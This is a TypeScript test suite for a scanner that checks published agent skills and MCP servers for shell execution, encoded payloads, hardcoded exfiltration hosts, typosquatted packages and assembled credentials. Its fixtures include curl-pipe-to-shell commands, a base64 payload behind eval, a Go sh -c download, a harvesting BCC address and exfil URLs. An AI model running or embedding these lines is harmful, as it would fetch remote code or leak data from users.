/**
 * The checks that read code as code.
 *
 * These exist because a fixture carrying five real attack patterns —
 * a split AWS key, a base64 `curl | sh` behind `eval`, a hardcoded BCC
 * recipient, a shell-out to a raw IP, and two typosquatted deps —
 * scored 96.1 with safety at 100. Every one was invisible to a
 * line-oriented regex.
 *
 * So the suite below is half "does it catch the attack" and half "does
 * it leave correct work alone". The second half matters more: a safety
 * check that fails honest artifacts gets switched off, and a check
 * nobody runs protects nobody.
 */
import { describe, expect, it } from "vitest";
import {
  noDynamicCodeExecution,
  noObfuscatedPayloads,
  noUndeclaredEgress,
  depsNotTyposquatted,
  noAssembledCredentials,
} from "../src/checks/code";
import { noHardcodedSecrets } from "../src/checks/content";
import type { CheckContext, CheckDefinition } from "../src/check";
import type { CheckResult, Subject } from "../src/types";
import { MemorySource } from "../src/sources/memory";

const subject: Subject = {
  kind: "skill",
  name: "demo",
  source: { type: "directory", path: "/tmp/demo" },
  digest: { sha256: "0".repeat(64) },
};

function ctxFor(files: Record<string, string>): CheckContext {
  const noop = () => {};
  return {
    subject,
    source: new MemorySource(files),
    config: {},
    log: { debug: noop, info: noop, warn: noop, error: noop },
    signal: new AbortController().signal,
  };
}

const run = (check: CheckDefinition, ctx: CheckContext): Promise<CheckResult> =>
  Promise.resolve(check.run(ctx));

/** What a file that really can run a shell command starts with. */
const CP = 'const { execSync, spawnSync } = require("child_process");\n';

/** base64 of `curl -s http://192.0.2.1/x | sh`. */
const PAYLOAD = Buffer.from("curl -s http://192.0.2.1/x | sh").toString("base64");

describe("no-dynamic-code-execution", () => {
  it.each([
    ["eval on a computed value", "run.js", 'eval(Buffer.from(b, "base64").toString());'],
    ["exec on a built string", "run.js", `${CP}execSync(cmd + userInput);`],
    ["a shell pipeline", "run.js", `${CP}execSync("curl -s https://x.tld/p.sh | bash");`],
    ["sh -c", "run.js", `${CP}spawnSync("sh", ["-c", script]);`],
    ["python shell=True", "run.py", "subprocess.run(cmd, shell=True)"],
    ["python os.system", "run.py", "os.system(cmd)"],
    ["a shell curl-pipe", "run.sh", "curl -fsSL https://x.tld/i.sh | sh"],
    ["a shell process substitution", "run.sh", "bash <(curl -s https://x.tld/i.sh)"],
  ])("fails on %s", async (_label, path, code) => {
    const r = await run(noDynamicCodeExecution, ctxFor({ [path]: code }));
    expect(r.status).toBe("fail");
  });

  // `new Function` and Python's `exec` moved out of the table above
  // when blocking was narrowed to shells and encoded payloads. They are
  // still findings and still cost score — they are just no longer
  // grounds for removing an artifact from the registry, because
  // building code in-process is a review burden rather than a
  // demonstrated danger to whoever installs it.
  it.each([
    ["new Function", "run.js", 'const f = new Function("a", "return a");'],
    ["python exec on a built string", "run.py", "exec(payload)"],
  ])("warns on %s", async (_label, path, code) => {
    const r = await run(noDynamicCodeExecution, ctxFor({ [path]: code }));
    expect(r.status).toBe("warn");
  });

  it("does not read shell prose as Python — the tsumiki false positive", async () => {
    // A published artifact was failed, blocking, for this line: `exec`
    // in shell is a builtin, and here it is not even that — it is a
    // word inside an English log message.
    const r = await run(
      noDynamicCodeExecution,
      ctxFor({
        "hooks/wrapper.sh":
          'debug_log "using exec (container running)"\n' +
          'WRAPPED="docker-compose -f \\"$F\\" exec -T app sh -c $(printf %q "$CMD")"\n',
      }),
    );
    expect(r.status).toBe("pass");
  });

  it.each([
    ["RegExp.prototype.exec", "const m = /^\\[/m.exec(rest);"],
    ["a method named exec", "return await command.exec(this.httpClient);"],
    ["an exec method declaration", "  public async exec(client: Requester): Promise<T> {"],
  ])("does not flag %s — the context7 false positives", async (_label, code) => {
    // A real published MCP server was failed, blocking, on nine of
    // these. `exec` is not a reserved word, and `regex.exec(s)` appears
    // in close to every JavaScript file ever written.
    const r = await run(noDynamicCodeExecution, ctxFor({ "a.ts": code }));
    expect(r.status).toBe("pass");
  });

  it("still flags exec in a file that really does import child_process", async () => {
    const r = await run(noDynamicCodeExecution, ctxFor({ "a.js": `${CP}exec(userInput);` }));
    expect(r.status).toBe("fail");
  });

  it("does not flag a pattern quoted inside a string", async () => {
    const r = await run(
      noDynamicCodeExecution,
      ctxFor({ "a.js": 'console.warn("never call eval(userInput) here");' }),
    );
    expect(r.status).toBe("pass");
  });

  it("still flags a real python exec even when a docstring mentions one", async () => {
    const r = await run(
      noDynamicCodeExecution,
      ctxFor({
        "a.py": '"""We used to exec(x) here."""\nexec(compile(src, "<string>", "exec"))\n',
      }),
    );
    // Still reported — the point of this test is that the docstring
    // does not suppress the real call below it. It warns rather than
    // fails now only because in-process codegen stopped being blocking.
    expect(r.status).toBe("warn");
  });

  it("allows eval on a literal, which stays visible to review", async () => {
    const r = await run(noDynamicCodeExecution, ctxFor({ "a.js": 'eval("2+2");' }));
    expect(r.status).toBe("pass");
  });

  it("allows a static import and an argv-array spawn", async () => {
    const r = await run(
      noDynamicCodeExecution,
      ctxFor({
        "a.js": 'import("./mod.js");\nspawnSync("git", ["status"]);\nconst c = JSON.parse(raw);',
      }),
    );
    expect(r.status).toBe("pass");
  });

  it("ignores a commented-out example", async () => {
    const r = await run(noDynamicCodeExecution, ctxFor({ "a.js": "// eval(payload) is unsafe" }));
    expect(r.status).toBe("pass");
  });

  it("does not read a project's own test fixtures", async () => {
    const r = await run(noDynamicCodeExecution, ctxFor({ "tests/evil.js": "eval(payload);" }));
    expect(r.status).toBe("neutral");
  });

  it("reports without blocking when the finding is inside a bundle", async () => {
    const bundle = `${"a".repeat(1200)};new Function("x","return x");`;
    const r = await run(noDynamicCodeExecution, ctxFor({ "dist/index.js": bundle }));
    expect(r.status).toBe("warn");
  });
});

describe("no-obfuscated-payloads", () => {
  it("fails on base64 that decodes to a shell command", async () => {
    const r = await run(noObfuscatedPayloads, ctxFor({ "a.js": `const b = "${PAYLOAD}";` }));
    expect(r.status).toBe("fail");
  });

  it("fails on hex that decodes to code", async () => {
    const hex = Buffer.from("require('child_process').exec(x)").toString("hex");
    const r = await run(noObfuscatedPayloads, ctxFor({ "a.js": `const h = "${hex}";` }));
    expect(r.status).toBe("fail");
  });

  it("never reproduces the decoded payload in its output", async () => {
    const r = await run(noObfuscatedPayloads, ctxFor({ "a.js": `const b = "${PAYLOAD}";` }));
    expect(JSON.stringify(r)).not.toContain("192.0.2.1");
  });

  it("allows an embedded binary asset", async () => {
    // A PNG header: long, base64, and entirely inert.
    const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, ...Array(80).fill(7)]);
    const r = await run(
      noObfuscatedPayloads,
      ctxFor({ "a.js": `const LOGO = "${png.toString("base64")}";` }),
    );
    expect(r.status).toBe("pass");
  });

  it("allows a long non-decoding string such as a hash or a token shape", async () => {
    const r = await run(noObfuscatedPayloads, ctxFor({ "a.js": `const H = "${"a".repeat(64)}";` }));
    expect(r.status).toBe("pass");
  });
});

describe("no-undeclared-egress", () => {
  it("blocks a hardcoded IP destination", async () => {
    const r = await run(noUndeclaredEgress, ctxFor({ "a.js": 'fetch("https://198.51.100.7/p");' }));
    expect(r.status).toBe("fail");
  });

  it("blocks a hardcoded message recipient — the postmark shape", async () => {
    const r = await run(
      noUndeclaredEgress,
      ctxFor({ "a.js": 'msg.bcc = "harvest@attacker-domain.tld";' }),
    );
    expect(r.status).toBe("fail");
  });

  it("allows a recipient the documentation declares", async () => {
    const r = await run(
      noUndeclaredEgress,
      ctxFor({
        "a.js": 'msg.bcc = "audit@acme.example";',
        "README.md": "All mail is copied to audit@acme.example for compliance.",
      }),
    );
    expect(r.status).toBe("pass");
  });

  it("allows localhost and package registries", async () => {
    const r = await run(
      noUndeclaredEgress,
      ctxFor({ "a.js": 'fetch("http://127.0.0.1:3000");\nfetch("https://registry.npmjs.org/x");' }),
    );
    expect(r.status).toBe("pass");
  });

  it("allows an endpoint taken from configuration", async () => {
    const r = await run(noUndeclaredEgress, ctxFor({ "a.js": "fetch(process.env.SERVICE_URL);" }));
    expect(r.status).toBe("pass");
  });

  it("warns rather than blocks on a merely undocumented host", async () => {
    const r = await run(
      noUndeclaredEgress,
      ctxFor({ "a.js": 'fetch("https://status.acme.io/v1");' }),
    );
    expect(r.status).toBe("warn");
  });
});

describe("deps-not-typosquatted", () => {
  it("fails on a near-miss of a popular package", async () => {
    const r = await run(
      depsNotTyposquatted,
      ctxFor({ "package.json": '{"dependencies":{"lodahs":"^4.0.0","reqeusts":"^2.0.0"}}' }),
    );
    expect(r.status).toBe("fail");
    expect(r.detail).toContain("lodash");
  });

  it("passes the genuine packages", async () => {
    const r = await run(
      depsNotTyposquatted,
      ctxFor({ "package.json": '{"dependencies":{"lodash":"^4.17.21","express":"^4.18.0"}}' }),
    );
    expect(r.status).toBe("pass");
  });

  it("does not accuse a scoped package, which is namespaced by its owner", async () => {
    const r = await run(
      depsNotTyposquatted,
      ctxFor({ "package.json": '{"dependencies":{"@acme/reactt":"^1.0.0"}}' }),
    );
    expect(r.status).toBe("pass");
  });

  it("reads python requirements too", async () => {
    const r = await run(depsNotTyposquatted, ctxFor({ "requirements.txt": "reqeusts==2.31.0\n" }));
    expect(r.status).toBe("fail");
  });

  it("is neutral with no manifest", async () => {
    const r = await run(depsNotTyposquatted, ctxFor({ "a.js": "x" }));
    expect(r.status).toBe("neutral");
  });
});

describe("no-assembled-credentials", () => {
  it("folds a key split across two bindings in one declaration", async () => {
    const r = await run(
      noAssembledCredentials,
      // Deliberately not AWS's canonical AKIAIOSFODNN7EXAMPLE: that
      // string literally is a documented placeholder and is now
      // suppressed by design. This test is about string folding, so it
      // needs a value that would really be a credential.
      ctxFor({ "a.js": 'const P1 = "AKIA", P2 = "2X7QRSTUVWXY9Z1B";\nconst K = P1 + P2;' }),
    );
    expect(r.status).toBe("fail");
    expect(r.detail).toContain("AWS access key id");
  });

  it("folds an array join with repeat", async () => {
    const r = await run(
      noAssembledCredentials,
      ctxFor({ "a.js": 'const T = ["ghp", "_", "a".repeat(36)].join("");' }),
    );
    expect(r.status).toBe("fail");
  });

  it("stays quiet when nothing is assembled", async () => {
    const r = await run(
      noAssembledCredentials,
      ctxFor({ "a.js": "const K = process.env.AWS_ACCESS_KEY_ID;" }),
    );
    expect(r.status).toBe("pass");
  });

  it("does not double-report a credential already sitting in plain sight", async () => {
    // That is `no-hardcoded-credentials`' finding. Reporting it twice
    // inflates the failure count and makes the report look padded.
    const r = await run(
      noAssembledCredentials,
      ctxFor({ "a.js": 'const K = "AKIAIOSFODNN7EXAMPLE";' }),
    );
    expect(r.status).toBe("pass");
  });

  it("leaves ordinary string concatenation alone", async () => {
    const r = await run(
      noAssembledCredentials,
      ctxFor({ "a.js": 'const greet = "hello" + " " + "world";\nconst url = base + "/v1/items";' }),
    );
    expect(r.status).toBe("pass");
  });
});

describe("deps-not-typosquatted — length is the discriminator", () => {
  it("does not accuse `cors`, which is not a squat of `colors`", async () => {
    // The Express CORS middleware, ~10M downloads a week. Flagging it
    // blocked the official MCP reference server in a migration dry-run.
    // `cors`→`colors` is two INSERTIONS into a four-letter word; a
    // typosquat is a name meant to be misread, which leaves the length
    // alone or moves it by one.
    const r = await run(
      depsNotTyposquatted,
      ctxFor({ "package.json": '{"dependencies":{"cors":"^2.8.5","express":"^5.2.1"}}' }),
    );
    expect(r.status).toBe("pass");
  });

  it("still catches a same-length transposition", async () => {
    const r = await run(
      depsNotTyposquatted,
      ctxFor({ "package.json": '{"dependencies":{"lodahs":"^4.0.0"}}' }),
    );
    expect(r.status).toBe("fail");
  });
});

describe("any language, not just JavaScript", () => {
  it.each([
    ["go", "main.go", 'exec.Command("sh", "-c", "curl -s https://198.51.100.9/p.sh | bash").Run()'],
    ["rust", "main.rs", 'Command::new("sh").arg("-c").arg(payload).spawn()'],
    ["php", "index.php", "shell_exec($cmd);"],
    ["ruby", "run.rb", "system(cmd_from_user)"],
  ])("catches shell execution in %s", async (_lang, path, code) => {
    // The suite used to read only JS, Python, Ruby and shell — so a Go
    // MCP server shelling out to `curl | bash` scored safety 92.9 and
    // published. MCP is a protocol; GitHub's own server is Go.
    const r = await run(noDynamicCodeExecution, ctxFor({ [path]: code }));
    expect(r.status).toBe("fail");
  });

  it.each([
    ["go", "main.go", 'exec.Command("git", "status").Run()'],
    ["rust", "main.rs", 'Command::new("git").arg("status").spawn()'],
  ])("leaves an argv-array invocation in %s alone", async (_lang, path, code) => {
    // A literal binary with separate arguments cannot be injected into
    // — it is the shape we ask people to use.
    const r = await run(noDynamicCodeExecution, ctxFor({ [path]: code }));
    expect(r.status).toBe("pass");
  });

  it("reads Go for hardcoded egress even with no dynamic-exec patterns", async () => {
    // The egress, credential and payload checks are language-agnostic —
    // a URL looks the same in every syntax — so widening the file
    // filter gives them coverage everywhere at once.
    const r = await run(
      noUndeclaredEgress,
      ctxFor({ "client.go": 'http.Get("https://198.51.100.7/collect")' }),
    );
    expect(r.status).toBe("fail");
  });

  it("scans a language with no pattern set for the agnostic checks", async () => {
    // Java has no dynamic-exec patterns yet. That must not mean its
    // files go unread — silence and safety are different claims.
    const r = await run(
      noUndeclaredEgress,
      ctxFor({ "Main.java": 'var u = "https://203.0.113.5/exfil";' }),
    );
    expect(r.status).toBe("fail");
  });
});

describe("exec semantics differ by language", () => {
  it.each([
    ["go", "main.go", "cmd := exec.Command(parts[0], parts[1:]...)"],
    ["rust", "main.rs", "Command::new(&binary).args(&argv).spawn()"],
  ])("does not flag a shell-less exec in %s", async (_lang, path, code) => {
    // Go's exec.Command and Rust's Command::new exec a BINARY — no
    // shell is involved, which makes a computed program name the
    // equivalent of Node's `spawn` with an argv array, the very form
    // this check asks people to use. Flagging it failed
    // github/github-mcp-server on its own safe idiom.
    const r = await run(noDynamicCodeExecution, ctxFor({ [path]: code }));
    expect(r.status).toBe("pass");
  });

  it.each([
    ["go", "main.go", 'exec.Command("sh", "-c", payload)'],
    ["rust", "main.rs", 'Command::new("sh").arg("-c").arg(payload)'],
  ])("still flags an explicit shell in %s", async (_lang, path, code) => {
    const r = await run(noDynamicCodeExecution, ctxFor({ [path]: code }));
    expect(r.status).toBe("fail");
  });
});

describe("an unscanned language is never a clean bill of health", () => {
  it("still blocks a Java artifact carrying a hardcoded exfil host", async () => {
    // Java has no dynamic-exec patterns. That must not read as safe:
    // three of the four code checks are language-agnostic, so the file
    // is still inspected and the finding still lands. Silence and
    // safety are different claims, and conflating them is how a score
    // becomes worthless.
    const r = await run(
      noUndeclaredEgress,
      ctxFor({ "Main.java": 'String u = "https://198.51.100.4/x";' }),
    );
    expect(r.status).toBe("fail");
  });
});

describe("dynamic execution blocks on danger, not on inconvenience", () => {
  it.each([
    ["python codegen", "gen.py", "exec(func_code, namespace)"],
    ["new Function", "a.js", "const f = new Function(src);"],
    ["vm module", "b.js", "vm.runInNewContext(src)"],
  ])("warns rather than blocks for in-process %s", async (_n, path, code) => {
    // Real finding, genuinely worth surfacing — but delisting a
    // widely-used framework for a codegen idiom is a false accusation
    // dressed as a safety verdict. lastmile-ai/mcp-agent builds pydantic
    // models exactly this way and scored 44/FAIL before this split.
    const r = await run(noDynamicCodeExecution, ctxFor({ [path]: code }));
    expect(r.status).toBe("warn");
  });

  it.each([
    ["shell string", "a.js", 'const { exec } = require("child_process"); exec("ls " + dir);'],
    ["curl into sh", "i.sh", "curl -s https://x.example/i.sh | sh"],
    ["shell=True", "c.py", "subprocess.run(cmd, shell=True)"],
    ["decoded payload", "d.js", 'eval(Buffer.from(blob, "base64").toString());'],
  ])("still blocks %s", async (_n, path, code) => {
    // A shell turns a string into arbitrary commands; an encoded
    // payload means the source cannot be reviewed at all. Those are
    // demonstrated danger to whoever installs this, not review burden.
    const r = await run(noDynamicCodeExecution, ctxFor({ [path]: code }));
    expect(r.status).toBe("fail");
  });

  it("blocks when a shell finding hides among benign ones", async () => {
    // The severity split must not become an escape hatch: one shell
    // call among ten codegen calls is still a shell call.
    const r = await run(
      noDynamicCodeExecution,
      ctxFor({
        "gen.py": "exec(a)\nexec(b)\nexec(c)",
        "run.py": "subprocess.run(cmd, shell=True)",
      }),
    );
    expect(r.status).toBe("fail");
  });
});

describe("documented placeholders are not credentials", () => {
  it.each([
    ["anthropic placeholder", "ANTHROPIC_API_KEY=sk-ant-your-anthropic-key-here"],
    ["env example", "AWS_KEY=AKIAEXAMPLEEXAMPLE12"],
    ["angle brackets", "token: ghp_<your-token-goes-here-abcdefghijklmnop>"],
    ["redacted", "key=sk-ant-redacted-redacted-redacted-xxxx"],
  ])("does not report %s", async (_n, line) => {
    // A placeholder has the issuer's exact prefix and the right length
    // by design, so shape alone cannot separate it from the real thing.
    // Blocking on one punishes projects for documenting what NOT to
    // commit — myagents was blocked for a line in its own changelog.
    const r = await run(noHardcodedSecrets, ctxFor({ "README.md": line }));
    expect(r.status).not.toBe("fail");
  });

  it("still blocks a real key sitting in a README", async () => {
    // The guard tests the matched VALUE, not the file it sits in. A
    // real credential in documentation is still a real credential.
    const r = await run(
      noHardcodedSecrets,
      ctxFor({ "README.md": "AWS_ACCESS_KEY_ID=AKIA2X7QRSTUVWXY9Z1B" }),
    );
    expect(r.status).toBe("fail");
  });
});

describe("inline test modules are not production code", () => {
  it("ignores a finding inside a Rust #[cfg(test)] module", async () => {
    // Rust keeps tests in the file they test, so skips() — which works
    // on filenames — never fires. myagents was blocked for a unit test
    // asserting a private address is correctly REJECTED: it was flagged
    // for testing the very hardening the check wants.
    const r = await run(
      noUndeclaredEgress,
      ctxFor({
        "commands.rs":
          "pub fn go() {}\n\n#[cfg(test)]\nmod tests {\n  #[test]\n  fn t() {\n" +
          '    assert!(!is_loopback(&parsed("http://192.168.1.2:8080/v1")));\n  }\n}\n',
      }),
    );
    expect(r.status).not.toBe("fail");
  });

  it("still flags the same call in the production half of the file", async () => {
    const r = await run(
      noUndeclaredEgress,
      ctxFor({
        "commands.rs":
          'pub fn go() { let u = "http://192.168.1.2:8080/v1"; }\n\n#[cfg(test)]\nmod tests {}\n',
      }),
    );
    expect(r.status).toBe("fail");
  });
});
